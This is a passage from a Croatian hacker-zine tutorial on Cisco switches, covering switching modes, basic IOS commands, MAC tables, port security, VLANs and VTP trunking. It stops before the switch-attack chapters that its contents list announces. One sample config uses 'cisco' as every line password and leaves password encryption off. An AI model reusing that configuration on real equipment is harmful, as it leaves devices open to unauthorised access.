                             
                             ...................
                       ...::: phearless zine #4 :::...
                                                           
.............>---[ Uncommon Tribute to Practical Switching ]---<............

............................>---[ by h44rP ]---<............................
                                                  h44rp.net[at]gmail[dot]com
                  
        
>=------------------------------------

[0x00]  Intro
[0x01]  General switching overview
   <0x01a>  Walk-about
   <0x01b>  Switching types
   <0x01c>  Transmission modes
[0x02]  Init configuration (Cisco)
   <0x02a>  Basic set-up
   <0x02b>  Managing MAC AT
   <0x02c>  Port control
[0x03]  Pure implementation
   <0x03a>  VLAN (VTP(ISL/802.1Q))
   <0x03b>  STP (BPDU uncovered)
[0x04]  Having fun 
   <0x04a>  Password smash (1900,2800,2950) 
   <0x04b>  CAM overflow
   <0x04c>  ARP spoofing & SPAN
   <0x04d>  VLAN 'hopping'
   <0x04e>  STP rooting
   <0x04f>  CDP oom & DHCP flood
[0x05]  Outro  

>=------------------------------------

NAPOMENA: svrha slijedeceg teksta nema nikakve ilegalne predznake te je
          napisan iskljucivo da vas, eventualno, educira o necemu sto do
          sada niste imali prilike nauciti!!! 
>=--------------------------------------------------------------------------


///////////////////////////////////////////////////////////////////////////
--==<[ 0x00 Intro
\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\


     Evo, nakratko pomaknut deadline (thnx bloodzero ;>) mi je omogucio da 
koliko toliko privedem kraju ovaj text, obecan u proslom tutorialu unatoc 
stvarno uzasnoj stisci s poslom i nekim osobnim stvarima. konceptualno ce 
biti slican kao prethodni i nadam se da cu uspijeti prenijeti neka znanja
i obuhvatiti sto vise toga.. opet kazem, mnogo lakse ce biti za razumijevanje
same materije onima koji posjeduju odredjena znanja o mrezama i mreznim 
protokolima te barem o osnovama mreznog kodiranja no vjerujem da i oni ostali
nece ostati preliveni nepoznanicama po zavrsetku citanja teksta..

Ovaj dokument ce nadam se pomoci i onima koji imaju problema s konfiguracijom
ili implementacijom odredjenih switching tehnologija kao i onima koje zanima
cisto stanje sa stajalista sigurnosti samih switcheva. Tijekom pisanja neke
stvari su testirane na Cisco switch-u serije 2900, 2950, a neke pak na seriji 
1900. Oni koji zele mogu skinuti Boson Router Simulator (http://www.boson.com)
koji podrzava simulaciju za 1900/2820 od ver. 4.15 te V4.00.00 softwarea. Isto 
tako vecinu metoda kasnije opisanih cete moci koristiti i na opremi drugih
proizvodjaca (Planet..), a neki od njih su daleeeko "gluplji" u mnogo pogleda
za razliku od cisco switcheva na koje je ovdje obracena najveca paznja!

Dakle, svrha je kao i kod proslog tutoriala, da uz saznanja o sigurnosnim 
nedostatcima i njihovom iskoristavanju odredjenog podrucja naucite i nesto 
konstruktivno, u ovim slucajevima vishe o odredjenim protokolima i tehnolo-
gijama te nesto o samom konfiguriranju obradjenih, mreznih uredjaja. 

Primjeri konfiguracija, algoritama, skice itd. itd. su iskljucivo moji
primjeri, a neki su pak iz sluzbenih cisco dokumenata pa u slucaju da uocite
kakvu pogresku, sto naravno nikako nije iskljucno, mozete me slobodno 
kontaktirati na mejl ili na irc.blackhatz.net #blackhatz, #phearless


///////////////////////////////////////////////////////////////////////////
--==<[ 0x01 General switching overview
\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\


--==<[  0x01a  Walk-about
      \_____________________________/
 

     Switch je kao sto svi znate prilicno jednostavan mrezni uredjaj koji ce
po primitku odredjenog paketa taj isti paket proslijediti destination hostu,
za razliku od hub-a koji salje odnosno multiplicira sam paket i salje ga
na sve svoje connected portove, (osim porta na koji je informacija primljena) 
a prihvaca ga "samo" mashina koja ga i ocekuje (i ona kojoj se netcard nalazi 
u PROMISC modu... zbog cega sniffanje na takvim LAN-ovima i nije toliko zani-
mljivo).. Switch ce segmentirati LAN u mikrosegmente te time smanjiti velicinu
kolizijskih domena, a svi ce hostovi ostati u jednoj te istoj broadcast domeni.
Dakle u jednostavnom switching okruzenju src i dest nodovi funkcioniraju kao 
da su te dvije mashine i jedine na mrezi! Kad se uspostavi konekcija izmedju 
takvih dvaju nodova oni koriste maksimalni moguci bandwidth. 

                            |---FA0/6--- ?
               ? ---FA0/1---|
   ___                      |                    ___
  |PC1|                   __|_                  |PC2|
 _|___|_   ----FA0/3---- |<-->| ----FA0/9----  _|___|_
|_______|                |____|               |_______|
                            |
                            |---FA0/14--- ?
                            |
               ? ---FA0/2---|

znaci PC1 i PC2 nodovi komuniciraju tako da njihov promet ne ide van na niti 
jedan interfejs osim na FA0/3 i FA0/9 na kojima su oni spojeni.

Ono cime su switchevi zapravo poboljsali performase jest smanjenjem prometa a 
povecanjem bandwidth-a! Njihove osnovne funkcije jesu switchanje data frame-ova 
i upravljanje switching operacijama. Jednostavan layer 2 switch forward-a frame
koristeci infomacije iz forwarding tabele, tj. na temelju MAC adresa. Kada
je paket adresiran na multicast, broadcast ili nepoznatu adresu switch salje
pakete na sve svoje portove. Switch takodjer ima svoju internu latenciju koja
se opisuje kao vrijeme od kada pocetak frame-a udje na switch do kada kraj
frame-a izadje sa switch-a, a mjeri se u djelovima sekunda. 

Switchevi takodjer koriste buffering kod spremanja i usmeravanja frame-ova,
a ponajvishe u slucaju kada je destination host zauzet "busy". Dio memorije
koju switch koristi u ovu svrhu se naziva memory buffer a moze koristit dvije
metode preusmjeravanja frame-ova a to su port-based memory buffering i shared 
memory buffering. Kod port-based principa frame-ovi se pohranjuju u queue koji
su linkani na odjredjeni port odnosno interfejs dok kod shared memory tipa
svi frameovi se ubacuju u odredjeni memorijski buffer koji medjusobno dijele
svi portovi na switchu. Switch koristi mapu frame-ova na port kako bi znao 
kamo treba odredjeni paket preusmjerit te se mapa brise nakon sto se odredjeni
frame uspjesno posalje na odredjeni interfejs.


--==<[  0x01b  Switching types
      \_____________________________/


     Dva su osnovna tipa switchinga a to su Layer2 i Layer3 switching. Dakle
kao sto sam rekao cijela mudrost jednostavnog switcha jest da uzme paket sa
jednog interface-a i proslijedi ga na drugi! Kao sto znamo iz text-a o 
routerima oni rade na layeru 3 odnosno mreznom OSI layeru kako bi mogli 
manipulirati paketima dok neki switchevi rade na layer-u 2 OSI-a tj. na 
"data link" layeru... (core ili distribution switch-evi)

osnovna razlika izmedju layer2 i layer3 switchinga jest u tipu informacije
unutar frame-a koju ce switch koristit da utvrdi tocan output interface.
naravno layer2 ce za to koristit MAC adrese dok ce layer3 koristit IP adrese.

layer2 preklopnik gleda odredisnu MAC adresu u frame headeru paketa te zatim
preko usporedbe s informacijama iz switching tabele odreduje koji ce biti
izlazni interface odnosno port za taj paket. switching tabela se naravno
nalazi u CAM-u tj. u Content Addressable Memory-i. ako kojim slucajem switch
nezna kamo s paketom, odnosno na koji interface da ga proslijedi onda ce on
broadcast-ati taj paket i kad dobi reply spremiti novu adresu u CAM!

Layer3 switching radi na network layeru sto mu samim time daje mogucnost da
iz samog header-a paketa izvuce vishe informacija od data-link-a.. kompletan
preces preusmjeravanja paketa se vrsi uz pomoc ip adresa koje se nalaze u 
paketima.

tu su takodjer jos dva tipa switchinga a to su simetricno i asimetricno 
switch-anje. osnovna bitna razlika je u tome sto je kod asimetricnog tipa
rada moguce recimo na jedan port, na kojem vam se na primjer nalazi spojen 
neki server, moze povecati bandwidth sto omogucava laksi i jednostavniji
protok paketa kada npr. vishe klijenata komunicira sa serverom sto pak kod
simetricnog tipa switchinga nije moguce.


--==<[  0x01c  Transmission modes
      \_____________________________/


     Sami switchevi podrzavaju i koriste nekoliko tehnika za usmjeravanje
frejmova. Medjutim dva su osnovna moda: SAF i CT:

* Store-and-forward - kod ovog nacina forwardanja frameova switch prihvaca
cijeli frame prije bilo kakvog forwardanja. Procitaju se odredisna i source
adresa i koriste se filteri prije obavljanja usmjeravanja.  problem ove 
metode je veca latencija jer ipak ovako switch prihvaca odnosno ceka dok
primi cijeli frame ali zbog toga moze provjeriti nakon preusmjeravanja
cijeli frame u kompletu u potrazi za pogreskama.

* Cut-through - naspram s-a-f metodi kod cut-trough principa frame se direkta
kroz switch prije nego li je on cijeli primljen.. znaci on cim procita mini-
malnu kolicinu informacija koja mu je potrebna za output i-face, a to je
dest MAC adresa on ce poceti proces forward-anja framea. Naravno ovako se 
uvelike smanjuje latencija no isto tako se bitno smanjuje mogucnost
detektiranja error-a.. postoje dve forme cut-through principa rada:

    --->  # Fast-forward - kao sto sama rijec kaze u njegovom nazivu, cilj
ovog nacina cut-through forwarding-a jest da latenciju svede na najmanju
mogucu razinu tako sto odmah nakon citanja dest MAC-a prosledjuje frame
na output port ali zato su cesto i frame-ovi s error-ima prosljedjeni no
svejedno njih ce discard-ati destination host kada do njega dodju. za 
razliku od klasicnog mjerenja latencije ovdje se onda mjeri od prvog 
primljenog bit do prvog poslanog bita.

    --->  # Fragment-free - prosledjivanje error frame-ova se ovom metodom
izbjeglo tako da je obracena paznja na najveceg uzrocnika gresaka u frameu,
a to je kolizijski fragment (64 byte) te se upravo provjerava njegova
velicina na temelju koje se utvrdjuje dali je paket odnosno frame error free
te se tek nakon sto se provjeri ova informacija prelazi u fazu forwardanja
samog frame-a. ovdje se isto tako latencija mjeri FIFO pravilom.. 


///////////////////////////////////////////////////////////////////////////
--==<[ 0x02 Init configuration (Cisco)
\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\


--==<[  0x02a  Basic set-up
      \_____________________________/


     U ovoj sekciji cu pokusati pojasniti neke osnovne stvari kod logiranja
i konfiguriranja samog switcha. Dakle kad dobijete u ruke neki switch da bi
znali konfigurirat neke jednostavne postavke itd. ovdje sam ukratko objasnio
simple konfiguraciju samo na cisco switchevima, a iz osobnog iskustva su
isti i najkompliciraniji za kongfiguraciju ukoliko se prvi puta susrecete s
njima za razliku od terminala nekih drugih proizvodjaca (Planet itd..).
Isto tako ako se barem malo procitali "Cisco Routers Exposed" onda ce vam
biti jednostavnije, mislim na snalazenje po configure modu i samom terminalu.
Naravno kao i kod vecine mreznih uredaja pristup na switch je moguce 
ostvariti lokalno (console, RS232) ili preko mreze (telnet). Samo sucelje
ovisi o proizvodjacu i seriji uredaja no neke osnovne konfiguracijske 
funkcije se pretjerano ne razlikuju medjusobno. 

Prilikom logiranja na cisco switch dobivate "Switch>" user odnosno disable 
mod shell iz kojeg se u privilegirani mode prebacujete komandom 
"switch>enable". u root terminalu, izvan konf moda mozete pregledavati 
trenutnu konfiguraciju switcha:

-----[code]------
switch#show running-config
-----[/code]-----

kao i sadrzaj NVRAM-a samog switch-a:

-----[code]------
switch#show startup-config
-----[/code]-----

Komandom "#show interface ?" mozete pregledati ipadresu odredjenog interface-a
kao i njegove ip postavke sa "#show ip interface ?" pregledavanjem odredjenog
interfejsa dobivate ispis njegovih postavki i trenutne statistike traffica:


Hardware is Built-in 10Base-T
Address is 000C.5687.3561
MTU 1500 bytes, BW 10000 Kbits
802.1d STP State:  Forwarding     Forward Transitions:  1
Port monitoring: Disabled
Unknown unicast flooding: Enabled
Unregistered multicast flooding: Enabled
Description:
Duplex setting: Half Duplex
Back pressure: Disabled

    Receive Statistics                     Transmit Statistics
-------------------------------------  -------------------------------------
Total good frames                   X  Total frames                        X
Total octets                        X  Total octets                        X
Broadcast/multicast frames          X  Broadcast/multicast frames          X
Broadcast/multicast octets          X  Broadcast/multicast octets          X
Good frames forwarded               X  Deferrals                           X
Frames filtered                     X  Single collisions                   X
Runt frames                         X  Multiple collisions                 X
No buffer discards                  X  Excessive collisions                X
                                       Queue full discards                 X
Errors:                                Errors:
  FCS errors                        X    Late collisions                   X
  Alignment errors                  X    Excessive deferrals               X
  Giant frames                      X    Jabber errors                     X
  Address violations                X    Other transmit errors             X
  
  
Naravno mnogo je parametara za "show" komandu, a najbolje je da sami testirate
i analizirate svaku sa "#show ?" komandom.  
  
Osnovne r/w operacije odnosno brisanje i reload same konfiguracije se vrsi
prilicno slicno kao na ruteru. 

-----[code]------
switch#erase startup-config
-----[/code]-----  

ce nam obrisati kompletnu startnu konfiguraciju odnosno konf fajl sa NVRAM-a,
a vracanje pocetnih vrijednosti se obavlja sa komandom:

-----[code]------
switch#reload
-----[/code]-----

podesavanje hostname-a i ip-a kao i svih kompleksnijih operacije vrsi se u 
configure modu samog terminala u koji ulazimo s conf term ili:

-----[code]------
switch#configure terminal
-----[/code]-----

passwordi se takodjer podesavaju ovdje i to posebno za "con" a posebno za 
"vty" kojih ima 0-? tj. koliko ima podesenih terminal remote linija. 

-----[code]------
switch(config)#line con 0              // ili vty za odredjeni login terminal
switch(config)#password ph34r1355
switch(config)#login
-----[/code]-----

konfiguracija layer 3 postavki takodjer je prilicno jednostavna te se konfa
za odredjeni interface slijedecom sintaksom:

-----[code]------
switch(config)#interface ?                  // odredjeni interface (VLAN...)
switch(config-if)#ip address 192.168.155.23 255.255.255.0
switch(config-if)#exit
-----[/code]-----

gateway se podesava takodjer iz config moda i to na slijedeci nacin:

-----[code]------
switch(config)#ip default-gateway 192.168.155.1       
switch(config)#exit
-----[/code]-----

nakon bilo kakve izmjene konfiguracije ako zelite da promjene ostanu stalne
morate prebaciti current konfiguraciju u NVRAM .. to cinite komandom

-----[code]------
switch#copy running-config startup-config
-----[/code]-----

sto pak vraca output slican ovom:

------[code]-----
Destination filename (startup-config)?
Building configuration
[OK]
switch#
-----[/code]-----

isto tako izuzeto je bitno da kopirate IOS image na neki externi TFTP
server or something kako biste imali spremljenu konfiguraciju van samog
uredaja. dakle morate znati ime samog iso image fajla sto cete doznati
iz show version komande.. znaci:

-----[code]------
switch#copy flash tftp
-----[/code]-----

Izlistat cu jedan primjer skonfiguriranog 24 port-nog switch-a..
Sve je izuzetno jednostavno za podesavanje te vam treba svega par minuta
vremena za implementaciju donje konfiguracije.. neke stvari ce mozda
nekome biti malo nejasne no sve sto nije do sada obradjeno ce biti kasnije 
(VLAN, STP..)...

-----[code]-----

!
version 12.1
no service pad
service timestamps debug uptime
service timestamps log uptime
no service password-encryption
!
hostname rhapsody
!
enable secret 5 $1$gPQz$1x5yG2VIPMQGGsTwjuOG11
!
ip subnet-zero
!
spanning-tree mode pvst
no spanning-tree optimize bpdu transmission
spanning-tree extend system-id
!
!
interface FastEthernet0/1
 switchport mode trunk
 no ip address
!
interface FastEthernet0/2
 switchport mode access
 no ip address
!
interface FastEthernet0/3
 switchport mode access
 no ip address
!
interface FastEthernet0/4
 switchport mode access
 no ip address
!
interface FastEthernet0/5
 switchport access vlan 10
 switchport mode access
 switchport port-security
 switchport port-security mac-address sticky
 switchport port-security mac-address sticky 000f.1fea.9d3a
 no ip address
!
interface FastEthernet0/6
 switchport access vlan 10
 switchport mode access
 switchport port-security
 switchport port-security mac-address sticky
 no ip address
!
interface FastEthernet0/7
 switchport access vlan 20
 switchport mode access
 switchport port-security
 switchport port-security mac-address sticky
 switchport port-security mac-address sticky 000f.1fea.6e0d
 no ip address
!
interface FastEthernet0/8
 switchport access vlan 20
 switchport mode access
 switchport port-security
 switchport port-security mac-address sticky
 no ip address
!
interface FastEthernet0/9
 no ip address
!
interface FastEthernet0/10
 no ip address
!
interface FastEthernet0/11
 no ip address
!
interface FastEthernet0/12
 no ip address
!
interface FastEthernet0/13
 no ip address
!
interface FastEthernet0/14
 no ip address
!
interface FastEthernet0/15
 no ip address
!
interface FastEthernet0/16
 no ip address
!
interface FastEthernet0/17
 no ip address
!
interface FastEthernet0/18
 no ip address
!
interface FastEthernet0/19
 no ip address
!
interface FastEthernet0/20
 no ip address
!
interface FastEthernet0/21
 no ip address
!
interface FastEthernet0/22
 no ip address
!
interface FastEthernet0/23
 no ip address
!
interface FastEthernet0/24
 no ip address
!
interface Vlan1
 ip address 192.168.102.100 255.255.255.0
 no ip route-cache
!
ip default-gateway 161.53.60.8
ip http server
!
!
line con 0
 exec-timeout 0 0
 password cisco
 login
line vty 0 4
 password cisco
 login
line vty 5 15
 password cisco
 login
!
end

-----[/code]-----

dakle iz gornjeg primjera mozete vidjeti koji su FEx i-fejsi podeseni, koje su
podrske ukljucene, kakav tip autentikacije se koristi, koji je gateway samog
switcha itd itd. konfiguraciju gateway-a, iface-eva, lozinki sam objasnio
u tekucoj sekciji a o konfiguraciji VLAN-a, STP-a, unapredjenju sigurnosti 
itd. biti ce rijeci kroz slijedeca poglavlja.. dakle ovo je bilo cisto malo i 
glupo pojasnjenje za one koji se nikad nisu susreli s ovakvim stvarima da barem 
malo, generalno steknu dojam gdje se sto nalazi i kako konfigurira. 


--==<[  0x02b  Managing MAC AT
      \_____________________________/
 
 
     Dakle MAC address tabela jest lista MAC adresa koje je switch doznao 
preko primljenih infomacija od mashina koje se nalaze na toj lokalnoj mrezi. 
Tabela sadrzi info o MAC-u, tipu te src i dest interface-ovima. Izlistavanje
iste vrsi se komandom:

-----[code]------
switch#show mac-address-table
-----[/code]-----

slijedi primjer output-a gore upisane komande:

-----[code]------
Dynamic Address Count:                2
Secure Address Count:                 0
Static Address (User-Defined) Count:  0
System Self Address Count:            13
Total MAC Addresses:                  15
Maximum MAC Addresses:                8192
Non-static Address Table:
Destination Address Address Type VLAN Destination
Port
------------------- ------------ ---- ---------------
0010.7a60.ad7e      Dynamic         1 FastEthernet0/2
00e0.2917.1884      Dynamic         1 FastEthernet0/5
-----[/code]-----

sto nakon:

-----[code]------
switch#clear mac-address-table
switch#show mac-address-table
-----[/code]----- 

daje isti ouput osim polja 1 gdje je vrijednost nula (0) sto naravno takodjer
utjece na tabelu pa ce ona biti prazna.. 
 
znaci frejmovi koji imaju destinacijsku adresu jednu od onih koje su spremljene
u MAC adresnu tabelu mogu biti uspjesno usmjereni na odredjeni interfejs.
Isto tako posto sam switch doznaje masu adresa koje sprema trebao bi ih i
nekako odrzavati odnosno provjeravati u slucaju da su odredjeni strojevi, recimo
iskljuceni, iskopcani sa switch.a itd itd.. za te slucajeve switch 
koristi metodu da ako ne primi frejm sa nekom, odredjenom, prije spremljenom
MAC adresom taj unos se automatcki brise iz tabele nakon 300 sekundi. 

isto tako moguce je podesiti staticke MAC-ove u tabeli za odredjene interfejse..
takva vrsta konfiguracije postize se sintaksom: 
     Switch(config)#mac-address-table static  <mac-address of host>  
                    interface FastEthernet  <Ethernet numer> vlan       
a za brisanje interfejsa koristite:
     Switch(config)#no mac-address-table static <mac-address of host>  
                    interface FastEthernet <Ethernet number> vlan <vlan name>
tj. primjer; u config modu:
 
-----[code]------
switch#mac-address-table static 00e0.2917.1884 interface FastEthernet 0/4 vlan1
-----[/code]----- 
 
 
--==<[  0x02c  Port control
      \_____________________________/ 


     Kontroliranje pojedinih portova odnosno interfejsa na switchevima je 
od iznimne vaznosti.. stoga switch ima komandu "port security" ... ova 
funkcija switch-a se podesava u configure modu pod opcijama odredjenog
interfejsa.. znaci .. #conf term, #configure FEx/x, #port security..
dodavanjem ? na zacelje komande naravno dobijamo moguce parametre za
konfiguraciju port security-a. znaci svrha samog port security jest da se
limitiranjem prihvacanja MAC adresa na odredjenim aktivnim portovima
onemoguci iskoristavanje propusta koje nude defaultne postavke...

ovo su "osnovni" parametri koje port security prihvaca u comm liniji:

* action - sto ce se poduzeti u slucaju narusavanja sigurnosti
* max-mac-count - maximalan broj mac-ova.    

dok 2950 sadrzi:

* aging - vrijeme za secure adrese na portu
* mac-address - osiguravanje mac-a (sticky) - prihvaca samo jedan uredjaj
* maximum - max broj mac-ova na portu odnosno interfejsu
* violation - akcija poduzeta zbog narusavanja sigurnosti (suspend, halt..)

preko gore navedenih parametara vrlo se lako moze kontrolirati mac pristup 
na odredjene interfejsove samog switch-a odnosno njegovo prihvacanje i 
spremanje istih u mac adresnu tabelu. stanje trenutno podesenih port-security
funkcija mozete pogledati komandom "switch#show port-security".

primjeri:

-----[code]------
switch#switchport port-security maximum 1
-----[/code]----- 

-----[code]------
switch#switchport port-security violation shutdown
-----[/code]----- 

znaci na odredjenom *interfejsu* npr. FastEthernet0/6 smo prvo
limitirali maksimalan broj MAC adresa na tom portu na samo jednu a u slucaju
narusavanja tog pravila izvrsava se akcija "shutdown".


///////////////////////////////////////////////////////////////////////////
--==<[ 0x03 Pure implementation
\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\


--==<[  0x03a  VLAN (VTP(ISL/802.1Q))
      \_____________________________/ 


     VLAN odnosno virtualni lanovi zapravo logicki segmentiraju komutirane
lan-ove bez obzira na fizicku lokaciju korisnika odnosno strojeva. velika 
prednost kod segmentiranja lokalnih mreza vlan-ovima u odnosu na standardne
metode fizickim utjecajima (premjestanjem kablova itd.) jest upravo
u tome sto se kompletna konfiguracija i maintain vrsi cisto softverski. vlan-
ovanje virtualno dijeli lan na vishe broadcast domena tako da paketi zapravo
se razmjenjuju iznimno dobro organizirano preko samo onih portova koji se 
nalaze u istom virtualnom lanu. 

               __________                __________
           ___|__VLAN 1__|___        ___|__VLAN 2__|___
          |                  |      |                  |
          |         ___      |      |      ___         |
  ____    |        |PC1|     |      |     |PC3|        |
 |<-->| <-------->_|___|_    |  -------->_|___|_       |
 |_S__| <-----   |_______|   |  |   |   |_______|      |
    |     |  |               |  |   |                  |
    |     |  |------------------|   |                  |
    |     |                  |      |                  |
    |     |         ___      |      |      ___         |
  __|_    |        |PC2|     |      |     |PC4|        |
 |<-->| <-------->_|___|_    |  -------->_|___|_       |
 |_S__| <-----   |_______|   |  |   |   |_______|      |
    |     |  |               |  |   |                  |
    |     |  |------------------|   |                  |
    |     |                  |      |                  |
   _|_    |__________________|      |__________________|   
  /   \            
 |  X  | --> router
  \___/
 
 
Dakle.. iz gornjeg primjera je vidljivo da su racunala PC1 i PC2 unatoc
cinjenici da su spojeni na razlicite switcheve u istom virtualnom lanu u
ovom slucaju je to VLAN 1 , a racunala PC 3 i PC 4 su u VLAN-u 2. Takodjer
je situacija da se PC2 i PC4 medjusobno prakticki ne "vide" iako se u biti
nalaze spojeni na istom switchu jer su medjusobno u razlicitim VLAN-ovima!

bitno je dakako da switch odrzava tabele za svaki VLAN posebno i kada dobije
zahtjev na port u specificiranom virtualnom lan-u pregledava samo bridging
tabelu za taj vlan.

Postoje tri osnovna tipa VLAN-ova podijeljena prema nacinu kontrole paketa:
  __________________
 | Port-based VLANs |
 |-------------------------
 | MAC address based VLANs |
 |-------------------------
 | Protocol based VLANs |
 |______________________|
    
Dakle prva metoda jest vlan-ovanje bazirano na portovima.. ovo je osobno a
i u vecini slucajeva najcesca metoda postavljanja virtualnih lan-ova na
switch upravo zbog toga sto se najlakse administrira i vrlo lako propagira
po drugim switch-evima. ujedno je i najjednostavnija za upotrebu i dobro
suradjuje s DHCP-om sto je nekome od iznimne vaznosti. Dakle ova metoda
se temelji na tome da recimo ako imamo switch od 24 porta i trebaju nam
dva vlan-a prvih 12 "fizickih" portova na switchu stavimo tj. definiramo
kao jedan a ostalih 12 kao drugi vlan. naravno onda nam nije tesko zapamtit
koji je koji chak i kada ih je vishe jer ih logicki rasporedimo po portovima
te prilikom dodavanja odredjenih uredjaja vec znamo range adresa, subnet,
na kojem odredjeni virtualni lan prihvaca pakete. ovo je naravno cisto
staticko vlan-ovanje!

ostala su dva tipa rjedje koristena upravo zbog toga sto se rucno mora 
unositi svaka MAC adresa u odredjeni VLAN isto kao i kod protocol based-a sto
je u biti kontrola preko ip adresa tj. layer3 kontrola kod koje isto tako
moramo rucno unositi ip adrese koje ce prilikom aktiviranja spadati pod
odredjeni VLAN. u ovim slucajevima mozete zaboravit na dhcp. ;P

razmjena informacija izmedju uredjaja (switch-switch/router) uglavnom se
vrsi ISL (Inter-Switch Link) frame tagging metodom odnosno protokolom. 
dakle kako se vlan-ovi mogu propagirati na druge switcheve i kako router
mora znati odredjene informacije za usmjeravanje paketa tako se i odredjene
informacije o tome salje mrezom upravom jednom frame tagging metoda. ISL 
header enkapsulira LAN frame i svaki header sadrzi specificni VLAN ID.
ISL je u medjuvremenu zamijenio 802.1Q tagging a tu je neizbjezno i da
spomenem LANE odnosno lan emulator koji takodjer spada u tu skupinu iako
u biti ne radi izvorni tagging vec preko ATM-a (Asynchronous Transfer Mode)
simulira ethernet mrezu. kod njega znaci sve virtualne konekcije koriste
odredjene VLAN ID-ove. kod LANE-a svaki paket koji stigne na switch biva
proshiren u headeru za specificni packet identifikator. isto tako prije 
dospjeca na destinaciju brise se vlan id i paket dolazi na odredishte.

implementacija vlan-a na cisco switch je prakticki trivijalna a sastoji se:

od ukljucivanja samog vlan-ovanja na switchu te:
-----[code]-----
Switch#vlan database
Switch(vlan)#vlan "broj"
Switch(vlan)#exit
-----[/code]-----

te dodjeljivanja odredjenog interface-a u neki od vlan-ova:

-----[code]-----
Switch(config)#interface fastethernet 0/20
Switch(config-if)#switchport access vlan "broj"
-----[/code]----- 
 
za verificiranje odnosno pregledavanje konfiguracije vlana koristite neke
od slijedecih komandi:

-----[code]------
switch#show vlan
-----[/code]-----

-----[code]------
switch#show vlan brief
-----[/code]-----

-----[code]------
switch#show vlan id
-----[/code]-----

VTP: 
 
Kod vlan-ova u igru ulazi i izraz trunking koji je u biti prisvojen od
odavno osmishljenih telefonskih trunkova kao sto znamo koji su omogucavali
komunikaciju odredenih end-pointa i glavne centrale. upravo taj princip koji
je koristen kod telefonskih i radio tehnologija je prisvojen i za podatkovnu
komunikaciju sada. ovdje je trunk zapravo logicka i fizicka veza izmedju 
dva switcha izmedju kojih se razmjenjuju podaci. a backbone je nishta drugo
do link koji se sastoji od vishe trunkova. 

   VLAN2--| |-------VLAN1    |      VLAN2--| |-------VLAN1 
          |_|_               |             |_|_
         |<-->|              |            |<-->|
         |_S1_|              |            |_S1_| 
          | |                |               |
   VLAN2--| |---VLAN1        |               |----- [TRUNK]
          |_|_               |             __|_
         |<-->|              |            |<-->|
         |_S2_|              |            |_S2_|
          | |                |             | |
   VLAN2--| |---VLAN1        |      VLAN2--| |---VLAN1
 
Dakle kao sto se vidi (ako se ishta vidi) ;p iz ove skice trunk je u ovom
slucaju ptp link koji podrzava vishe VLAN-ova. svrha trunking je dakako i
vishe nego ocita... ako na primjer dodamo josh par vlan-ova po potrebi onda
cemo potrebovati josh vishe portova za S1-S2 komunikaciju sto nam naravno 
nikako ne odgovara!

switching tabela na oba kraja trunka moze port forwardati, bazirano na info-
rmacijama o destination MAC adresi. naravno sto je vishe vlan-ova to sve ove
procedure traju dosta duze. trenutno su u igri dve vrste trunkinga a to su:
frame filtering i frame tagging. kod frame tagging-a dodjeljuje se 
identifikator pojedinom frame-u kako bi se dobilo na brzini kod forwardanja
isto tako kod tagginga se svaki frame od pojedinog vlan-a na trunka tagira
kako bi se automatski znalo kojem vlan-u taj frame i pripada. tagging sam
spominjao i prije u ovoj sekciji gdje sam naveo da su principi tagging-a 
ISL, 802.1Q... (za vishe info-a PgUp*2) ;)  
 
za konfiguriranje trunka prvo pogledajte kakvu enkapsulaciju podrzava port
a zatim ga ukljucite slijedecom sintaksom:

-----[code]------
switch(config-if)#switchport mode trunk
switch(config-if)#switchport trunk encap * (dot1q, isl)
switch#show trunk
-----[/code]-----
 
evo kad vec opsirnije idem u tagging da objasnim malo bolje ISL tagging
metodu.. isl sam reko da je trunking protokol koji sluzi za ekapsulaciju
VTP poruka.. kod ovog tipa prenosa vtp-a u isl frame se ubacuju vtp header
i vtp message segmenti. evo primjer takvog frejma:

========================================================================
========================================================================
                       ISL header  (26 bytes)                          |
------------------------------------------------------------------------
                      Ethernet header (14 byts)                        |
------------------------------------------------------------------------
                         LLC header (3 byts)                           |
------------------------------------------------------------------------
                         SNAP header (3 byts)                          |
------------------------------------------------------------------------
****************************[VTP HEADER]*******************************|
------------------------------------------------------------------------
****************************[VTP MESSAGE]******************************|
------------------------------------------------------------------------
                                 CRC                                   |
------------------------------------------------------------------------
========================================================================
 
U VTP porukama se nalaze cetiri osnovne stvari:

    * VTP verzija protokola - verzija 1 ili 2
    * VTP vrst poruke: jedna od cetiri vrste
    * velicina management domain name-a: velicinu imena koje slijedi
    * management domain name: ime konfano za management domenu

Josh je jednu stvar bitno spomenuti a to je da switchevi koji dakle koriste
i propagiraju virtualne lan-ove mogu biti funkcionalni u tri moda.. to su
server, klijent i tranparent. server moze kreirati, modificirati i brisati
vlan-ove i njegove konfiguracijske parametre za cijelu domenu dok klijenti
ne mogu ni kreirati ni mijenjati niti brisati bilo kakve vlan parametre..
transparent mod sluzi da usmjeravanje vtp obavjesti ali taj switch ignorira
sve sto se nalazi u poruci! takodjer postoje tri vrste vtp poruka.. to su:
advertisement request, summary adv. i subset adv.. sa advertisement zahtjevom
klijent zahtjeva informacije o virtualnom lanu i server switch odgovara sa
summary i subset porukama. summary-ji se po deafultu salju otprilike svakih
pet minuta.

subset obavjest sadrzi VTP verziju, domain name i revizijski broj konfiga.
obavjest se salje nakon odredjene akcije kao sto je kreiranje ili brisanje
vlan-a, suspendiranje ili aktiviranje istog, zatim promjena imena vlan-a,
MTU-a itd. itd.

konfiguracija domenskog imena ili moda rada VTP-a je zaista trivijalna i 
svodi se na upisivanje moda nakon #vtp komande... (status, server..)

PODINTERFEJSI:

evo prije nego zatvorim ovaj section da spomenem i subinterface-e koji su
zapravo logicki interfejsi kreirani na fizickim portovima odnosno i-face-ovima
kao sto je npr. FE0/10. svakom se podinterfejsu moze dodijeliti ip adresa i
svaki podrzava jedan VLAN. da bi sve to radilo kako spada morate za svaki vlan
kreirati podinterface. npr. za Fast Ethernet 0/0 kreirate FE 0/0.2 i 0.3 itd.

sintaksa:

-----[code]------
switch(config)#interface FastEthernet 0/0
switch(config-if)#full duplex
switch(config-if)#no shutdown
switch(config)#interface FastEthernet 0/0.1
switch(config-subif)#description Management VLAN2
...
-----[/code]----- 


